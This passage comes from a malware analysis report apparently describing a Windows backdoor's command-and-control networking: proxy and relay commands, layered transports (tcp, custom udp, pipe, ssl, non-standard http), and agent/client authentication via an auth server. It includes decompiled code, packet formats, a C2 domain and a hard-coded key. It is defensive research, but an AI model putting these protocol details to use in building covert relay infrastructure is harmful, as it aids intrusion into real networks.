The command connectCommand is examined here as an array of 4 unsigned DWORDs. After receiving this command, the client creates a new, separate connection with the primary host, from which it receives the connection configuration string for connecting to the secondary host. After connecting, the client sends to the primary host a 4-byte status code indicating the progress of this operation. A status code of 0 is sent if the connection was successfully created, otherwise the appropriate error code is sent. Then the primary and secondary hosts proceed to exchange data.
In contrast to Mode 1, Mode 2 does not create a separate connection for data exchange between the primary and secondary hosts. Instead, the commands to connect to new hosts and the data sent to already connected secondary hosts are transmitted over the same control connection. This requires additional headers to be added to data transmitted over the control connection to distinguish their recipients.
The differences between Mode 1 and Mode 2 are illustrated below:
 Mode 1 Mode 2
The additional header of the buffer transmitted from the primary server to the client has the following format:

typedef struct
{
    int dataSize;     //  Size of transmitted data 
    int connectionID; //  Connection identifier
    int state;        //  Connection state
    char data[]       //  Data
} BRIDGED_CONTROL_CONNECTION_DATA_HEADER;


Data from the client to the secondary host is then transmitted as is, without this header. When transmitting data within an already established connection, the value of the header state field is set to BRIDGED_PACKET_DATA_TRANSMISSION = 0×0. If a data transfer error occurs, the control connection is sent an empty buffer with the header state field set to BRIDGE_CONNECTION_ERROR = 0×4 and connectionID containing the identifier of the corresponding connection.
To establish a new connection, the primary server sends the client a buffer containing the configuration string of the new secondary connection with state = BRIDGED_PACKET_ESTABLISH_NEW_CONNECTION=0×1 and the identifier of the new connection (connectionID). The identifier connectionID is generated by the primary server. After successfully establishing a secondary connection, the client sends the primary server an empty buffer with state = BRIDGED_PACKET_CONNECTION_ESTABLISHED (0×2) and the corresponding connectionID. If the connection is unsuccessful, an empty buffer with state = BRIDGED_PACKET_ERROR is sent.
Command with ID = 502
This command implements an auth server (see the description of the client, agent, auth, and control transports) created in a separate thread. The command takes a serialized string containing the configuration of the server connection (serialization key = 0xC01FA) as a parameter.
Command with ID = 505
This function creates a separate thread in which a proxy server is started. The proxy server implements its own custom protocol for establishing a connection with the target host. This proxy server may be called a raw proxy because it can operate only on the transport layer, specifically with the tcp transport and the udp transport without establishing a connection (raw mode). Please note that a connection from the client to the proxy can be established using any available transport that is supported by the backdoor. However, the connection from the proxy to the target host can be established only by using the tcp and raw udp transports. Therefore, the raw proxy can be viewed as a kind of gateway for exchanging data with other, external, network hosts.
 
This command takes the serialized number of the port that must receive the incoming connection (serialization key = 0×201FE) as a parameter. This raw proxy port listens on all available network interfaces.
The procedure for establishing a connection is as follows:
1.	The client establishes a connection with the raw proxy.
2.	The client sends a command to connect to the target host. The command has the following format:

typedef struct
{
    unsigned short unused;  
    unsigned short dstPort; // Target host port
    in_addr dstAddr;        // Target host IP address
    char configStr[];       // String containing connection configuration elements
} RAW_SERVER_CONNECT_COMMAND;


If dstAddr is not specified (zero), the name of the target host is taken from the configuration string whose length does not exceed 512 bytes. The configuration string has the standard format used by the backdoor. However, only the !proto parameter defining the transport-layer protocol is significant when the string is parsed. If udp is not indicated for this protocol, the connection is established over the TCP protocol. If the configuration string begins with the [ character, the IPv6 version of the corresponding protocol is used. Upon successful connection to the target host, the server sends the code 0×0000000000005A00 to the client and the sides proceed to exchange data. If an error occurs, the code 0×0000000000005B00 is sent.
9. Network subsystem architecture
9.1. Overview of the transport subsystem components
The transport subsystem implemented by the analyzed backdoor is very advanced. The code that implements various components of this subsystem makes up around 70% of the total volume of the backdoor code.
The transport subsystem of the backdoor includes entities known as factories, transport interfaces, transports, and connections. Factories are responsible for instantiating transport interfaces and connections. When the factories are created, they are registered in the orchestrator context, and each of them has its own unique integer ID. In the analyzed backdoor instances, only one factory with the ID 0×01 is used by default.
A transport interface provides all other backdoor components with an interface to do the following:
•	Establish outgoing connections (as a client) and receive incoming connections (as a server).
•	Receive data from a remote host and send data to it.
•	Receive information about the connection state.
•	Terminate a connection.
The main purpose of transport interfaces is to conceal the internal hierarchy of transports and the interaction between different levels of this hierarchy.
Each transport is a component (class) that implement a specific network protocol. Transports form a hierarchy amongst themselves. Each transport may be higher, lower, or on the same level as another transport. A higher-level transport always operates over a lower-level transport.
The names of transports are presented below in the same format in which they are encountered in the backdoor code. Please note that the network protocol that is actually implemented by a transport with a specific name may differ from the standard implementation of the protocol with the same name and may have a completely different functionality and properties as will be shown in the section describing the specific transports.
Transports can be divided according to their respective layers of the OSI model:
•	Transport layer, providing reliable data transfer between network hosts: tcp, udp, pipe.
•	Session layer, providing continuous exchange of information through a set of data transfers between hosts: ssl, http, https, proxy-http.
•	Application layer, implementing high-level logic for establishing connections and transmitting data between backdoor instances or between a backdoor and a C2: raw, auth, control, client, agent.
This list of transports can be expanded by installing additional network plugins. The transports listed here are embedded into the backdoor by default.
The reference hierarchy presented here is not actually reflected in the backdoor code but nevertheless provides a convenient overview of the properties of backdoor transports. Despite the fact that named pipes pertain to the session layer of the OSI model and the HTTP and HTTPS protocols pertain to the application layer, the corresponding backdoor transports named pipe, http, https, and proxy-http in this analysis are attributed to other OSI model layers based on their usage context and the properties of the protocol that is actually implemented by the specific network transport.
For example, the pipe transport implemented by the backdoor is used in the code exclusively to ensure reliable data transfer between hosts. Therefore, we attribute this transport to the transport layer of the OSI model within the context of this analysis. The http/https transport implements a protocol that is different from standard HTTP/HTTPS. It operates over the lower-level transports and creates a logical data transfer session that can be resumed if the connection on the transport layer is disrupted. For this reason, and based on its usage context in the backdoor, this transport is attributed to the session layer of the OSI model in our analysis.
A transport does not encapsulate its packets into another transport on the same layer, even though this may be technically possible. Therefore, the tcp transport will not operate over the udp and pipe transports by encapsulating its own packets into these protocols. For example, technically the http transport can operate over the ssl transport. However, a separate session-layer https transport is logically created for this configuration in the backdoor.
Please note that application-layer transports can operate over each other, for example, when a higher-level transport implements or supplements the procedure for establishing a connection to another host. In this case, the packet encapsulation rule mentioned above remains in force.
Each transport can operate as a client or as a server. A transport operates as a server when the method named ListenToConnection is called. This method accepts incoming connection requests from a client.
Unless otherwise specified, for our purposes a connection shall refer to a hierarchy of specific instances of transports that are used to transfer data between backdoor instances and between a backdoor and a C2.
9.2. Creating transport interfaces and connections. Configuring connections
As mentioned earlier, transport interfaces and connections are instantiated by a factory. A transport interface can own only one connection at a time. However, a transport interface can close the current connection and open another connection (instantiated using the factory) based on a previously used or newly created connection configuration.
A connection configuration includes the identifiers of transports that form this connection, and the parameters necessary for their operation (such as the names of hosts, IP addresses, and ports).
The procedure for creating transports must be registered in the factory. In the context of a factory, each transport is identified by its name. However, this does not apply to application-layer transports, which are not registered in the factory but instead are instantiated directly by a transport interface.
The primary way to define the configuration of connections in a backdoor is to use a specifically formatted string that can be described as follows (in extended Backus—Naur form syntax):
    

ConnectionConfig ::= ConnectionSubConfig {";" , ConnectionSubConfig}
ConnectionSubConfig ::= [SessionProtocolName , "://"], ["["] , HostParameters , ({"|", SessionProtocolParameter} | [TransportProtocolSpecification])
HostParameters ::= Path | (HostName, ":", PortNumber)
SessionProtocolName ::= Identifier
SessionProtocolParameter ::= ("!" , ParameterName, "=", ParameterValue) 
TransportProtocolSpecification ::= ("!", "proto", "=", TransportProtocolName)
TransportProtocolName ::= Idenitifier 
ParameterName ::= Idenitifier 
ParameterValue ::= (Idenitifier) | (Number)
HostName ::= Identifier
PortNumber ::= Number
Identifier ::= (can use all printable ASCII characters except ";" , "|", "://", "!")
Path ::= (standard path in the Windows file system)
	    

	
More intuitively, the configuration string for a connection with a specified host can be presented as follows:
    

"://""|!proto=""|""="..."|!type="	
	    

	
At the beginning, before the "://" string, the name of the session-layer transport is specified, whose creation procedure must be registered in the factory under the corresponding name. For example, this name can be http, https, orssl— see the list above.
After the "://" string, a description of the network host to connect to (or listen to if acting as a server) follows. For example, a URL will be entered for the http transport. If a transport-layer protocol is used for the pipe transport, the name of the pipe will be here; for the udp/tcp transports, the host:port pair will be used.
The !proto parameter defines the name of the transport-layer transport (tcp, udp, or pipe) that the newly created connection will operate over. If this parameter is not specified, the tcp transport is selected by default.
The !type parameter defines the name of the application-layer transport (auth, control, connect, or agent). If it is not specified, the transport type is selected based on the operating context of the interface. For example, the agent transport is used by default in the loop for receiving and processing commands from the C2.
A connection to a specified host may traverse multiple relay nodes. The connection between neighboring hosts in this chain are also defined by a configuration string. The configuration strings for connections of relay nodes are separated from each other by the ; character. Therefore, the configuration of a connection to a destination host via multiple relay nodes generally looks as follows:
;; ...
;.	    
	
Several examples of connection configurations are presented below:
1.	"ssl://192.168.1.166:8530|!proto=udp;ssl://igloogawk.com". This string describes a connection to the C2 server igloogawk.com via the relay node 192.168.1.166. The relay node configuration "ssl://192.168.1.166:8530|!proto=udp" describes a connection using an ssl session-layer transport operating over a udp transport using network host 192.168.1.166:8530 for a remote connection (this string was extracted from a sample configuration and describes the connection to a C2). The destination host configuration "ssl://igloogawk.com" describes a connection using an ssl transport operating over a tcp transport (as mentioned earlier, this transport is selected by default when no transport is explicitly specified).
2.	"raw://192.168.1.166:2212|!proto=udp|!udp_type=raw". This string describes a connection to the server 192.168.1.166:2212 (also used as a C2, or more specifically as a relay node to it). The selected session-layer transport is the raw pseudoprotocol, which is not registered in the factory and does not have a separate component (class) for its implementation. Use of the reserved word raw as the name of the session-layer transport means that this connection uses only the transport layer for data transfer. In other words, raw is an empty session-layer protocol. The lower-level transport here is udp. The configuration includes an additional parameter named udp_type whose raw value indicates that the configuration will use a udp transport version that does not provide support for sessions, reliable delivery or correctly ordered data assembly. For more details, see the description of the udp transport.
9.3. Specific transports
Functions of the transport interface have the prototypes presented below:
    

void CloseConnection(TRANSPORT *this);
StatusCode ConnectToServer(TRANSPORT *this);
StatusCode SendBuf(TRANSPORT *this, const char *buffer, int bufLen);
StatusCode RecvBuf(TRANSPORT *this, const char *buffer, int bufCapacity);
BOOL IsConnectionEstablished(TRANSPORT *this);
StatusCode ListenToConnection(TRANSPORT *this);
StatusCode AcceptConnection(TRANSPORT *this, TRANSPORT **acceptedConnection);
char * GetPeerNameString(TRANSPORT *this);
u_short GetPeerAddressData(TRANSPORT *this);
__int64 GetTransportDescriptor(TRANSPORT *this);
StatusCode SendSessionControlCmd(TRANSPORT *this, int cmd, const char *cmdArgs, unsigned int cmdArgsSize);
StatusCode RecvSessionControlCmd(TRANSPORT *this, int *cmd, const char *cmdArgsBuf, unsigned int cmdArgsBufCapacity);
	    

	
The transport interface includes the standard functionality:
•	Establish a connection with a server (ConnectToServer).
•	Receive incoming connections from clients (ListenToConnection, AcceptConnection).
•	Send and receive data (SendBuf, RecvBuf).
•	Receive connection status information, and information about the remote host of the connection (IsConnectionEstablished, GetPeerNameString, GetPeerAddressData).
There are uncommon functions as well, such as the following:
•	Get the transport descriptor (GetTransportDescriptor).
•	Send and receive session control commands (SendSessionControlCmd, RecvSessionControlCmd).
Let's take a closer look at the uncommon elements of the transport interface. The transport descriptor is a 64-bit integer. In particular, for a connection over the pipe transport, this will be the HANDLE of the named channel, and for connections over the udp and tcp transports, the descriptor of the corresponding socket.
This abstraction is introduced to provide uniform polling of the connection array for incoming data or readiness to send data. This uses an extended version of the int WSAAPI WSAPoll(LPWSAPOLLFD fdArray, ULONG fds, INT timeout) function, which differs from the original through its ability to uniformly poll both sockets and pipes—both anonymous and named—in the current implementation of the backdoor. The transport system of the backdoor uses only non-blocking sockets and pipes.
The polling function is registered in a factory. The set of descriptor types to process can thus be extended by creating a new factory and registering the appropriate polling function in it.
The aforementioned functions for sending and receiving session commands (SendSessionControlCmd, RecvSessionControlCmd) are only used by application-layer transports to exchange service commands when initiating a connection.
TCP
This transport belongs to the transport layer. It is used by default if the connection configuration does not explicitly specify the transport level.
The transport is implemented on top of IPv4 (configuration name tcp) and IPv6 (configuration name tcp6). The IPv6 protocol is also used if the configuration string separates the name of the session-layer protocol from the host parameters with the character sequence "://[", as, for example, in ssl://[igloogawk.com
The core transport functions essentially constitute a wrapper for the Winsock API, as the entire scope of network operations is implemented inside that library.
The configuration may additionally contain bind_ip parameter: the local address with which to associate the socket used in the transport.
UDP
According to the hierarchy provided in the "Overview of the transport subsystem components" section, udp belongs to the transport layer, which implies reliable transfer of data between hosts.
This is a case where the transport name, udp, does not reflect the properties of the actual protocol implementation, something we will examine below. Here’s an example of a connection configuration that uses this transport:
    

raw://192.168.1.166:2212|!proto=udp|!udp_type=raw
	    

	
The transport in question can function in one of two modes:
•	Raw UDP, where data is sent inside basic UDP datagrams with no extra logic overlaid. The udp_type=raw parameter in the connection configuration corresponds to that mode.
•	Connection-oriented protocol over the UDP that ensures a connection between hosts, reliable delivery of packets and integrity of transferred data, which makes it somewhat similar to the TCP. A cursory comparison with analogous protocols that work on top of the UDP shows a certain vague similarity with SCTP and RUDP protocols. All in all, this is a full-featured custom protocol that provides reliable data transmission between hosts.
Further description of the UDP transport protocol will assume the connection-oriented mode by default.
The UDP is logically divided into a connection handler and interfaces, with a one-to-many relationship between these. The connection handler is executed in a separate thread, which is created, always in a single copy for each backdoor instance, as long as there is at least one active connection on top of the UDP transport.
The connection handler implements all of the protocol logic. Its functions include the following:
•	Polling transport descriptors for incoming data or readiness to send data.
•	Generating and supporting a list of active connections—this is a global list for a backdoor instance.
•	Generating outgoing packets and parsing incoming ones.
•	Initiating and terminating connections.
•	Ensuring that incoming data is correctly assembled.
Data sharing between the transport interface and connection handler relies on anonymous pipes initialized when a connection is set up. Thus, for example, from an interface standpoint, sending data means simply writing it to the appropriate pipe:
    

int __fastcall UdpTransport::SendBuf(UDP_TRANSPORT *this, const char *dataToSend, DWORD dataLen)
{
  if ( this->connectionState == UDP_CONNECTION_ESTABLISHED )
    return WritePipe(this->sendPipeInterfaceEndpoint, dataToSend, dataLen);
  else
    return ERR_NOT_CONNECTED;
}
	    

	
The connection handler, which implements all of the data-sending logic, receives the above data. Data reception is similar to that: the interface simply reads the data from the appropriate pipe, where it was written by the connection handler after accepting and processing:
    

int __fastcall UdpTransport::RecvBuf(UDP_TRANSPORT *this, char *buf, DWORD bufCapacity)
{
  if ( this->connectionState >= UDP_CONNECTION_ESTABLISHED )
    return ReadDataFromPipe(this->recvPipeTransportEndpoint, buf, bufCapacity);
  else
    return ERR_NOT_CONNECTED;
}
	    

	
The method above is used both for data being sent or received and service messages about connection status. If the transport is running in server mode, pointers to newly accepted connections are transmitted in a similar way:
    

int __fastcall UdpTransport::AcceptConnection(UDP_TRANSPORT *this, UDP_TRANSPORT **acceptedConnectionPtr)
{
  int readPipe; 
  int status; 
  UDP_TRANSPORT *acceptedConnection; 

  readPipe = this->recvPipeInterfaceEndpoint;
  acceptedConnectionPtr = 0i64;
  status = ReadDataFromPipe(readPipe, &acceptedConnectionPtr, 8u);
  if ( !status )
    status = ERR_NETWORK_DATA_TRUNCATED;
  if ( acceptedConnection )
    *acceptedConnectionPtr = acceptedConnection;
  return status;
}
	    

	
Packet format
A packet consists of a header and data. The header has the following format:
    

[data size (2 bytes)][connection identifier (stream id, 4 bytes)][number within the sequence (sequence number, 4 bytes)][flags (1 byte)][data]
	    

	
The purpose of a packet is defined by flags, of which there are four:
1.	UDP_SYN = 1: establishing connection
2.	UDP_ACK = 2: confirmation
3.	UDP_FIN = 4: connection termination
4.	UDP_DEMAND_CHUNK = 8: packet request
We explain more about how these are used below.
The connection identifier (stream id) allows the host to tell which connection a packet it received belongs to.
The sequence number (sequence number) defines the order of assembling packets into one buffer upon receiving.
Initiating and terminating a connection
Initiating a connection is a two-step process:
1.	To initiate a connection, the client sends the server a message with a UDP_SYN flag and a client_stream_id in the message packet body.
2.	The server responds with a message with UDP_SYN|UDP_ACK flags and a server_stream_id.
The client_stream_id and server_stream_id each have a size of 4 bytes, and they are generated by the host randomly. Generated identifiers are guaranteed not to match the identifiers of other UDP connections within the same backdoor instance. The purpose of these identifiers is to define the UDP transport connection that the packet belongs to.
To terminate the connection, the host sends the recipient a UDP_FIN packet and closes the connection.
Data transmission
Data is transmitted in packets of up to 1460 bytes including the packet header. This data size was probably selected to ensure that a total packet size never exceeded the Ethernet MTU.
A data packet has no flags. Upon receiving a data packet, the host sends the recipient a UDP_ACK packet with the sequence number of the received packet. Received packets are collected into a single buffer according to their sequence numbers and forwarded to the interface.
Lost packets are requested again as follows:
1.	For each connection, the system stores the sequence number of the next packet that must be sent to the interface. Let's assume that number is N.
2.	Suppose the host receives a packet with the sequence number N+m, but the previous packets with numbers N+1, ... N+m-1 have not been received yet. In that case, the host requests that the missing packets be resent by sending UDP_DEMAND_CHUNK packets with sequence numbers N+1, ..., N+m-1. This is done for each packet that arrives out of sequence. Therefore, UDP_DEMAND_CHUNK packets for the same sequence number may be sent multiple times.
3.	If the packet thus requested is received, the host sends a UDP_DEMAND_CHUNK|UDP_ACK confirmation with the sequence number of the received packet.
Considering that UDP_DEMAND_CHUNK packets may be sent multiple times, the host waits before resending the requested packet. It starts counting the requests and only resends when the number reaches 32, whereupon the counter is reset.
PIPE
It belongs to the transport layer according to the hierarchy provided in the "Overview of the transport subsystem components" section. It is registered in a factory under the name pipe. This transport is implemented on top of Windows named channels. Here's an example configuration of a connection that uses this transport: raw://name_of_the_pipe|!proto=pipe
This transport wraps around the functions for working with WinAPI named channels.
In particular, establishing a connection (ConnectToServer) is done with the help of the CreateFileA API; receiving and processing incoming connections (ListenToConnection, AcceptConnection)—with the help of the CreateNamedPipeA and ConnectNamedPipe functions; data receiving and sending—with the help of the ReadFile and WriteFile API calls. Below is an example of the ListenToConnection function used by this transport:
    

__int64 __fastcall PipeTransport::ListenToConnection(PIPE_TRANSPORT *this)
{
  __int64 result; 
  unsigned int v3;
  int hDataPipe; 
  HANDLE EventA; 
  PIPE_TRANSPORT *i; 

  this->isServer = 1;
  result = CreatePipeNoBlockingMode(&this->hControlPipeRead, &this->hControlPipeWrite, 0i64, 0);
  v3 = result;
  if ( (int)result < 0 )
    return result;
  hDataPipe = (unsigned int)CreateNamedPipeA(
                              this->transportPipePath,
                              0x40080003u,
                              0,
                              0xFFu,
                              0x100000u,
                              0x100000u,
                              0,
                              0i64);
  if ( hDataPipe < 0 )
    return -GetLastError();
  EventA = CreateEventA(0i64, 1, 0, 0i64);
  this->pipeOverlapped.hEvent = EventA;
  if ( !EventA )
    return -GetLastError();
  this->hDataPipeInstance = hDataPipe;
  if ( !ConnectNamedPipe(hDataPipe, &this->pipeOverlapped) )
  {
    result = -GetLastError();
    if ( result != -ERROR_IO_PENDING && result != -ERROR_PIPE_CONNECTED )
      return result;
    v3 = 0;
  }
  if ( PipeTransport::ActiveConnectionsList )
  {
    this->next = PipeTransport::ActiveConnectionsList;
    for ( i = PipeTransport::ActiveConnectionsList; i->next; this->next = i )
      i = i->next;
    i->next = this;
  }
  else
  {
    PipeTransport::ActiveConnectionsList = this;
  }
  this->next = 0i64;
  if ( !PipeTransport::ConnectionsListHead
    && !CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)PipeTransport::CleanupInactiveConnections, 0i64, 0, 0i64) )
  {
    return -GetLastError();
  }
  return v3;
}
	    

	
In server mode, all incoming connections created by pipe transports are placed in a single global (within the backdoor instance) list of active connections (PipeTransport::ActiveConnectionsList in the above example). A separately created thread goes through the list every 100 seconds, closing every active connection (PipeTransport::CleanupInactiveConnections in the above list).
Note that adding connections to and removing from PipeTransport::ActiveConnectionsList is done without any synchronization primitives (such as critical sections or mutexes) despite the fact that the list may be accessed by several threads.
This transport probably serves as an option for communication between logically isolated network segments and a C2 (through a relay node) for when transmission of data (commands) via the usual protocols is problematic.
SSL
This transport belongs to the session layer according to the hierarchy provided in the "Overview of the transport subsystem components" section and implements the SSL protocol. It is registered in a factory as ssl or ssl3.
Similarly to the TCP transport, it wraps around the functions of the WolfSSL library statically linked to the examined sample. This library implements the entire scope of operations involved in initiating/terminating connections and sending/receiving data.
A version of the transport named ssl implements TLS version 1.3, and the ssl3 version implements SSL version 3.
Server certificate is not verified when a connection is initiated.
HTTP (HTTPS)
This is a session transport in this backdoor's terms. It works on top of the underlying (transport-layer) transport, whose job is to ensure reliable data transmission between hosts. Note that this transport does not follow the HTTP specification.
The HTTP transport is implemented in the form of two logical components:
1.	Interface
2.	Separate thread that sends and receives data
The interface interacts with the thread through a series of anonymous pipes. For example, when calling the interface method SendBuf(TRANSPORT *this, char *buf, DWORD bufLen) for sending data, the data to be sent is simply written to the appropriate pipe, while the thread handles all the work of sending and receiving data across the network.
Only one copy of the thread is created every time. It processes every existing HTTP transport connection, each of which is registered globally as part of the backdoor process.
The main transport parameters (host, url, protocol version, and additional headers) are defined in the transport configuration string.
A connection is established as follows:
1.	The client sends a POST request to the url specified in the config.
2.	When the server accepts the connection, it sends the response, "HTTP/200″, in contrast to the standard success response, "HTTP/200 OK". It is worth noting that the protocol uses the Content-Length header in a non-standard way. Unlike the standard HTTP, where this header contains the message body length (the part following the headers and double CRLF), in this protocol, Content-Length contains the length of the entire HTTP packet including the headers and message body. The body of each of the above requests/responses contains an extra header formatted as follows:
    

struct HttpChunkHeader
{
    char encodeKey;      // Key used to encrypt the header  
    DWORD dataSize;      // Size of the data that follows the header 
    QWORD connectionId;  // Connection identifier 
    char checkSum;       // Checksum 
}
	    

	
The checkSum is calculated as a byte sum modulo 2 (XOR) of the entire preceding part of the header. After calculating the checksum, all the packet headers and data, with the exception of encodeKey, are encoded with the single-byte XOR cipher using the encodeKey. No data is sent with these headers, although the format allows it. The purpose of exchanging headers when initiating a connection is to communicate to the client the server-generated identifier of the new connection, connectionId.
After a connection is established, the hosts exchange data. The data is transmitted unchanged, with no added HTTP headers or transformations.
The transport can run in two modes:
1.	"Connection: keep-alive" leaves the transport connection open after sending/receiving all of the data.
2.	"Connection: close" closes the connection every time after all of the data is sent/received. The choice of mode depends on the headers in the connection requests.
The protocol provides an option to resume the transport connection if there are transport-layer connection errors. So, if there was a client-side transport error, it reconnects to the server, sending the appropriate connectionId of the interrupted connection in the request header (HttpChunkHeader).
The HTTPS transport is the above http transport running on top of the SSL transport.
PROXY-HTTP (PROXY-HTTPS)
This transport wraps around the HTTP/HTTPS transport, adding a HTTP proxy connection feature that supports authentication. The transport supports two authentication methods: Basic and NTLM.
When connecting to an HTTP proxy, the client first tries the Basic authentication method. Failing that, it attempts to get authenticated with NTLM.
9.4. Application-layer transports
As mentioned above, protocols in this application layer run on top of the session-layer transports. Unlike the lower-layer protocols, the functions for creating these transports are not registered in a factory but instantiated directly by the transport interface when creating a new connection. So, the backdoor has a rigidly defined set of application-layer transports that cannot be extended with a system of network plugins.
The backdoor sample we are analyzing contains four application-layer transports: auth, control, client, and agent. In transport configuration, the application-layer protocol is defined by the value of the !type parameter: ssl://igloogawk.com|!type=auth. Application-layer transport may also be defined using the keyword raw, which signifies that the connection uses no protocols belonging to the layer in question and sends raw data.
The control, client, and agent transports run on top of the auth transport. Let's take a closer look at each.
AUTH
The main function of this transport is to provide a mechanism for sending session control commands to the application-layer protocols above it. To implement this, the auth transport defines the SendSessionControlCmd and RecvSessionControlCmd methods, and implements a connection procedure of its own by redefining the EstablishConnection method. The backdoor samples we studied have no other transports apart from auth that provide session control on the application level.
This transport uses two connection modes: direct and relay. It implements the following protocol when connecting directly:
1.	The client connects to the server on the transport and session levels.
2.	The client sends the server a COMMAND_CONNECT command (code = 0×00) without arguments.
3.	If the server responds with a COMMAND_CONNECT_RESPONSE command (code = 0×01) without arguments, the connection is considered to be established.
4.	If the server responds to the client with a COMMAND_RECONNECT command (code = 0×08), the connection procedure restarts at Step 1.
Here's a diagram of the process:
 
In the above description and the descriptions of the other application-layer transports, all commands are sent/received with the help of the SendSessionControlCmd/RecvSessionControlCmd methods.
A connection through a relay node (referred to as "proxy" going forward) is established as follows:
1.	The client connects to the proxy on the transport and session levels.
2.	The client sends the proxy a COMMAND_CONNECT_TO_PEER command (code = 0×02), providing a configuration string for a connection to the next intermediate or final network route point as an argument.
3.	The proxy establishes a direct connection to the next point if it's the final point or uses the protocol we are describing if it's another relay node.
4.	Upon connecting to the relay node, the proxy sends the client a COMMAND_CONNECTION_ESTABLISHED command (code = 0×06) without arguments. The connection is then considered to be established, and data transmissions begins.
Here's a diagram of this protocol:
 
Commands in this transport are sent in the following format:
    

typedef struct 
{
    char key;
    char commandValueDecodingTableId;
    char encodedCommand;
    int  argumentSize;
    char headerCheckSum;
    char argumentData[]; 
} COMMAND_PACKET;
	    

	
The argumentSize field is converted to big-endian when the packet is generated. Other header elements are not modified during packet generation. Also when a packet is generated, the system calculates a headerCheckSum value as a byte sum modulo 2 (XOR) of the commandDecodingTableId, encodedCommand, and argumentSize fields. This sum is checked when the command is received.
After the checksum is calculated, each byte of the generated packet including its headers and data is XORed with the key value. The key is randomly generated during packet generation. The key is guaranteed to be non-zero.
Command codes are not transmitted explicitly. They are encoded using a substitution table that must be the same for the client, server, and every relay node. encodedCommand is the command value after encoding with the table in question. commandValueDecodingTableId is the identifier of the table among all tables of this type in the backdoor. Although there can be several substitution tables used by various transports, the samples under review use just one, with the number 1, shown below:
    

char commandEncodingTable = [0x24, 0x64, 0x13, 0xA4, 0xB2, 0x2C, 0x4F, 0x9F, 0xAF];
	    

	
AGENT/CLIENT
The agent and client transports are used as the main application-layer transport when setting up a connection with the C2. Establishing a connection with the help of these transport requires an extra host that we will designate as the auth server. This is not a name used in any of the samples—we introduce it here for convenience. We will designate the hosts connected by the above transports as Host 1 and Host 2. The agent and client transports are paired transports in the sense that if Host 1 is connected to the auth server through agent, the Host 2 may be connected to the auth server only through the client transport, and vice versa.
The connection that the backdoor instance uses to receive commands to execute has the agent type. The usage context suggests that the connection used by the backdoor operator to send commands to the auth server for the backdoor to execute has the client type.
A possible interaction pattern is presented in the diagram below:
 
Each backdoor sample is capable of functioning as an auth server, which enables it to use virtually any running backdoor instance (such as previously infected machines on the target network or compromised servers on the Internet) as a C2 as long as the operator can connect to the host with the backdoor as the client. A logical connection between the infected host and the backdoor operator is created, which may be relayed through numerous compromised hosts.
The auth server accepts a new agent connection on the lower transport levels and establishes a connection via the auth transport protocol, with the agent and client running on top of it. This uses the connection option without a relay node (see the description of the auth transport). After that, the system searches for a suitable free client connection. If none is available, the new connection remains in standby. If a suitable client connection is available or appears, the auth server mediates a session between that and the newly accepted connection. This is followed by transmission of data, which the auth server also mediates. The above is true for a new client connection, too. Two connections, auth and client, that are free (in standby mode) are considered suitable if both have the client authenticity validation flag set or neither does. This parameter, NEED_TO_ENSURE_CLIENT_AUTHENCITY, is set in the transport configuration (serialization key = 0×30047).
Let's take a closer look at the protocol for connections between the agent and client hosts.
As mentioned above, the auth server mediates a session between the client and agent hosts, which they use to exchange data. The data is encrypted with an RC4 session key that the parties generate while connecting. The parties agree on a session key using the elliptic-curve Diffie—Hellman ephemeral (ECDHE) protocol. The encryption helps to hide the contents of transmitted data from the auth server.
The session initiation protocols differ depending on the aforementioned NEED_TO_ENSURE_CLIENT_AUTHENCITY (key = 0x30047) parameter. If this parameter is set, the session initiation procedure gets extra steps to authenticate the correspondents, namely to make sure that the connecting parties are not some outside clients not authorized by the backdoor operators.
Let's take a closer look at the session initiation protocol from the standpoint of a client that implements the agent transport.
1.	The client initiates a connection with the auth server (referred to as the server in this description) on the transport and session levels.
2.	The client sends the server a COMMAND_CONNECT_AGENT command (code = 0×3) with a connect request argument, which contains data required for establishing a connection. The connect request contains the following serialized data:
o	Ephemeral public key to generate a session key (serialization key = 0x50052)
o	Data compression type (serialization key = 0x30051)
o	Client authenticity validation flag NEED_TO_ENSURE_CLIENT_AUTHENCITY (serialization key = 0x30047)
3.	If there is no need to validate authenticity (NEED_TO_ENSURE_CLIENT_AUTHENCITY == 0), the server finds a suitable client, and then sends the agent a COMMAND_CONNECT_CLIENT command (code = 0x4) with a connect response argument. This argument includes the following:
o	Connect request message received from the client when initiating a session with the auth server . The message contents are described in item 2. 1;
o	String peer info representing the client details (for example, ":"), serialization key 0xC0048. The client is sent a COMMAND_CONNECT_AGENT command with a connect response argument, which includes the same types of components: a connection request and host details. After exchanging the data, the parties agree on a session key, and the connection is considered to be established. Data is exchanged via the server.
4.	If the authenticity of the parties needs to be validated (NEED_TO_ENSURE_CLIENT_AUTHENCITY == 1), the server sends the agent a COMMAND_RECONNECT, command with a message to sign argument (serialization key = 0x5004F)—a randomly generated 32-byte array.
5.	The agent calculates the digital signature of the received message by using a digital signature pattern based on the Edwards-curve Digital Signature Algorithm (EdDSA). The private key is defined in the transport configuration (serialization key = 0x50049). Then the agent sends he server another COMMAND_CONNECT_AGENT command with a connect request signed argument, which includes the following:
o	Message to sign (serialization key = 0x5004F)
o	Its digital signature (serialization key = 0x50050)
o	Public key for validating the signature (serialization key = 0x5004E)
o	Newly generated ephemeral public key for generating a session key (serialization key = 0x50052)
o	Data compression type (serialization key = 0x30051)
o	Client authenticity validation flag NEED_TO_ENSURE_CLIENT_AUTHENCITY (serialization key = 0x30047)
6.	The server validates the message it received, which must satisfy the following conditions:
o	The received message to sign must match the sent message.
o	The received public key for message validation (serialization key = 0x5004E) must match the public key defined earlier on the server. For the samples under review, this is a hard-coded array: 6E 98 0C 6B 8F 5F 70 5C 27 61 54 05 03 DF 64 C5 FA 28 92 5D 5A 94 6C 21 F7 7F 4F 00 B4 11 E5 A1.
o	The digital signature received must be valid. If authentication is successful, a session is initiated as described in item 3. The initiation and authentication procedure for client connections follows the same steps, except that the COMMAND_CONNECT_CLIENT command is sent in place of the COMMAND_CONNECT_AGENT.
Here's a diagram of this protocol:
 
Transmission of data via connections of this type uses buffers preceded by headers of the following format:
 [ ]
	
The message number, uncompressed data size, and the data itself are encrypted with the RC4 session key generated previously as the connection was established. When a party receives a new data buffer, it sends a confirmation in the form of an empty buffer with the following header:
 [   ]
	
Every field in the packet save for the first one is encrypted with the session key. Note that data whose receipt was not confirmed will not be resent. The mechanism is used for recording session data transfer statistics, which will be covered below.
